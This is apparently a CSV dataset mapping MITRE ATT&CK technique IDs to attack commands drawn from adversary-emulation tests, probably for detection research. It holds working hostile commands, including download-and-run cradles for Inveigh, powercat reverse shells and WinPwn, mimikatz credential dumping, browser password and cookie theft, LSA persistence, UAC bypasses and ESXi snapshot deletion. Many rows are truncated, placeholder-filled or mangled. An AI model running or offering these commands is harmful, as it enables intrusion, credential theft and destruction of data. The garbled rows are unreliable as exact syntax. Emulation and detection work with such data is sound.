mitre_id,command
T1140,copy  %windir%\system32\certutil.exe  %temp%\tcm.tmp  %temp%\tcm.tmp  -encode  var_224  %temp%\t1140_calc2.txt  %temp%\tcm.tmp  -decode  %temp%\t1140_calc2.txt  %temp%\t1140_calc2_decoded.exe
T1115,echo ifconfig | pbcopy $(pbpaste)> /dev/null 2>&1 # id_88
T1578,gcloud compute snapshots create var_70400
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y# run_7972"
T1578,"aws ec2 create-snapshot --region var_601 --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1046,sudo nmap -ss #{network_range} -p #{port} telnet #{host} #{port} nc -nv #{host} #{port}
T1112,reg add hkey_current_user\software\microsoft\windows\currentversion\winlogon /t reg_dword /v allowmultipletssessions /d 1 /f
T1546,"new-itemproperty -path hklm:""\software\microsoft\windows nt\currentversion\appcompatflags\custom"" -name ""atomicredteamt1546.011"" -value ""atomicredteamt1546.011"" new-itemproperty -path hklm:""\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb"" -name ""atomicredteamt1546.011"" -value ""atomicredteamt1546.011"""
T1059,"powershell.exe ""iex (new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\enigma0x3\misc-powershell-stuff\a0dfca7056ef20295b156b8207480dc2465f94c3\invoke-apppathbypass.ps1'); invoke-apppathbypass -payload '%systemroot%\system32\cmd.exe'"""
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c #{server_ip} -p #{server_port}
T1127,"copy ""var_20740 \t:library %temp%\libhello.js"
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_768"""
T1218,"hh.exe -decompile %temp% ""#{local_chm_file}"""
T1580,"export aws_region=var_705 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress var_9974
T1105,(new-object net.webclient).downloadstring('#{target_remote_file}') | out-file #{output_file}; invoke-item #{output_file}
T1221,"start ""#{docx_file}"""
T1550,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\kevin-robertson\invoke-thehash\01ee90f934313acc7d09560902443c18694ed0eb\invoke-wmiexec.ps1' -usebasicparsing);invoke-wmiexec -target var_479
T1134,"var_56346"" ""exit"""
T1555,"esentutl.exe /y ""%localappdata%\google\chrome\user data\default\login data"" /d ""#{output_path}""# run_3641"
T1518,fltmc.exe | findstr.exe 385201> /dev/null 2>&1 # id_52
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\namedpipe\namedpipesystem.ps1')> /dev/null 2>&1 # id_77
T1020,"$filename = ""var_523"
T1087,"ldapsearch  -h  ldap:\\var_263""  -s  sub  -a  always  -z  1000  dn"
T1552,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  passhunt  -local  $true  -noninteractive
T1556,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""var_884"" -destination ""%systemroot%\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $authenticationpackagesvalues = $lsakey.getvalue(""authentication packages"") $authenticationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""authentication packages"" $authenticationpackagesvalues"
T1055,$process = start-process var_53578 -passthru $pathtoatomicsfolder\t1055\bin\x64\rtlcreateuserthread.exe -pid $process.id -debug
T1001,"cat ""var_35378"" | tail -n 1 | base64 -d | sh"
T1491,"echo """" | ""var_35227"" ""esxcli system welcomemsg set -m 'ransomware-notification'"""
T1115,echo  get-process  |  clip  get-clipboard  |  iex> /dev/null 2>&1 # id_82
T1016,"""#{recon_commands}"""
T1007,"echo  ""[*]  listing  sysv  init  scripts  (\etc\init.d):""  if  [  -d  \etc\init.d  ];  then  ls  -l  \etc\init.d;  else  echo  ""\etc\init.d  not  present  on  this  system"";  fi  echo  echo  ""[*]  listing  runlevel  directories  (\etc\rc*.d):""  ls  -ld  \etc\rc*.d  2>\dev\null  ||  echo  ""no  \etc\rc*.d  directories  found""> /dev/null 2>&1 # id_30"
T1003,"""#{mimikatz_exe}"" ""sekurlsa::minidump #{input_file}"" ""sekurlsa::logonpasswords full"" exit"
T1222,attrib.exe -r #{file_or_folder}\*.* /s
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_108"""
T1016,test-netconnection -computername var_16778
T1041,if(-not  (test-path  var_814  -method  post  -body  $filecontent  -disablekeepalive
T1134,"start-process ""var_450"" -argument ""-u:t -p:e cmd"" start-sleep -second 5 stop-process -name ""cmd"" -force -erroraction silentlycontinue"
T1115,echo  get-process  |  clip  get-clipboard  |  iex# run_8090
T1033,set file=var_654\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%
T1530,"$storage_account_objects = import-csv -path ""var_889"
T1069,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe""  -f  (objectcategory=group)  var_31566"
T1217,"$url_regex = '(htt(p|s)):\\([\w-]+\.)+[\w-]+(\[\w- .\?%&=]*)*?' $history = get-content -path ""var_585"""
T1543,sudo cp var_881
T1569,psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt> /dev/null 2>&1 # id_81
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_45274"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1485,"echo """" | ""var_177'`; do vim-cmd vmsvc\snapshot.removeall $i & done"""
T1020,"$filename = ""var_337"
T1124,net time \\#{computer_name} w32tm /tz
T1113,import -window root var_288
T1217,where \r c:\users\ places.sqlite> /dev/null 2>&1 # id_65
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  5> /dev/null 2>&1 # id_12"
T1012,reg query hkcu\software\policies\microsoft\windows\installer \v alwaysinstallelevated reg query hklm\software\policies\microsoft\windows\installer \v alwaysinstallelevated# run_5099
T1124,net time \\var_611 w32tm \tz
T1614,locale
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_779"""
T1057,"start-process -filepath ""c:\temp\externalpayloads\pchunter_free\var_25849"""
T1652,driverquery /v /fo list driverquery /si /fo list# run_1372
T1055,"""#{psexec_path}"" /accepteula \\#{machine} -c #{mimikatz_path} ""lsadump::lsa /inject /id:500"" ""exit""# run_4930"
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_5167
T1187,rpcping -s var_906 \a connect \u ntlm 1>$null
T1119,new-item  -path  $env:temp\t1119_powershell_collection  -itemtype  directory  -force  |  out-null  get-childitem  -recurse  -include  *.doc  |  %  {copy-item  $_.fullname  -destination  $env:temp\t1119_powershell_collection}# run_9107
T1201,secedit.exe /export /areas securitypolicy /cfg output_mysecpol.txt# run_9666
T1564,sudo dscl . -create /users/#{user_name} uniqueid 333# run_8191
T1197,bitsadmin.exe \transfer \download \priority foreground var_290
T1486,which_openssl=`which openssl` $which_openssl genrsa -out var_348
T1578,az snapshot create --resource-group var_973 --location eastus
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y# run_5370"
T1195,"kubectl run var_21712 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1531,dscl . -delete \users\var_397 #enter admin password
T1482,"""var_940"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_407 write-host ""end of golden saml"""
T1220,"""var_467"""
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_728"""
T1219,"start-process -filepath ""c:program files (x86)\splashtop\splashtop remote\server\var_34787"""
T1202,# copy command to clipboard set-clipboard -value 'var_566')
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh# run_6159
T1539,"$devtoolsport = 57556 $testurl = ""https://www.google.com"" stop-process -name ""chrome"" -force -erroraction silentlycontinue $chromeprocess = start-process ""chrome.exe"" ""$testurl --remote-debugging-port=$devtoolsport --profile-directory=default"" -passthru start-sleep 10 $jsonresponse = invoke-webrequest ""http://localhost:$devtoolsport/json"" -usebasicparsing $devtoolspages = convertfrom-json $jsonresponse.content $ws_url = $devtoolspages[0].websocketdebuggerurl $ws = new-object system.net.websockets.clientwebsocket $uri = new-object system.uri($ws_url) $ws.connectasync($uri, [system.threading.cancellationtoken]::none).wait() $get_all_cookies_request = '{""id"": 1, ""method"": ""network.getallcookies""}' $buffer = [system.text.encoding]::utf8.getbytes($get_all_cookies_request) $segment = new-object system.arraysegment[byte] -argumentlist $buffer, 0, $buffer.length $ws.sendasync($segment, [system.net.websockets.websocketmessagetype]::text, $true, [system.threading.cancellationtoken]::none).wait() $completemessage = new-object system.text.stringbuilder do { $receivedbuffer = new-object byte[] 56060 $receivedsegment = new-object system.arraysegment[byte] -argumentlist $receivedbuffer, 0, $receivedbuffer.length $result = $ws.receiveasync($receivedsegment, [system.threading.cancellationtoken]::none).result $receivedstring = [system.text.encoding]::utf8.getstring($receivedsegment.array, $receivedsegment.offset, $result.count) $completemessage.append($receivedstring) } while (-not $result.endofmessage) $ws.closeasync([system.net.websockets.websocketclosestatus]::normalclosure, ""closing"", [system.threading.cancellationtoken]::none).wait() try { $response = convertfrom-json $completemessage.tostring() $cookies = $response.result.cookies } catch { write-host ""error parsing json data."" } write-host $cookies stop-process $chromeprocess -force"
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_158
T1609,kubectl create -f var_27108
T1197,"set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventname:desktopimgdownldr"
T1083,"start-process ""var_37718"" start-sleep -second 4 stop-process -name ""dirlister"""
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } $ver = $excelapp.version $excelregpath=""hkcu:\software\microsoft\office\$ver\excel\options"" remove-item $excelregpath -erroraction ignore new-item -type directory $excelregpath | out-null new-itemproperty $excelregpath open -value ""/r notepad.xll"" -propertytype string | out-null $excelapp.quit() start-process ""excel"""
T1053,"reg add ""hkey_current_user\software\classes\mscfile\shell\open\command"" /ve /t reg_expand_sz /d ""c:\windows\system32\#{payload}"" /f schtasks /create /tn ""#{task_name}"" /tr ""compmgmt.msc"" /sc onlogon /rl highest /f echo let's open the computer management console now... compmgmt.msc"
T1119,mkdir %temp%\t1119_command_prompt_collection >nul 2>&1 dir c: /b /s .docx | findstr /e .docx for /r c:\ %f in (*.docx) do copy /y %f %temp%\t1119_command_prompt_collection
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_56553"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1055,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""#{txt_path}"" -officeproduct ""word"" -sub ""execute"""
T1123,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f> /dev/null 2>&1 # id_18
T1124,"reg query ""hklm\system\currentcontrolset\control\timezoneinformation"" \v timezonekeyname# run_1485"
T1036,"mkdir -p /tmp/atomic-test-t1036.006 cd /tmp/atomic-test-t1036.006 mkdir -p 'testdirwithspaceend ' [ ""$(uname)"" = 'freebsd' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running t1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running t1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null chmod +x 'testdirwithspaceend /init ' './testdirwithspaceend /init '# run_8540"
T1556,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""var_875"" -destination ""%systemroot%\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $notificationpackagesvalues = $lsakey.getvalue(""notification packages"") $notificationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""notification packages"" $notificationpackagesvalues"
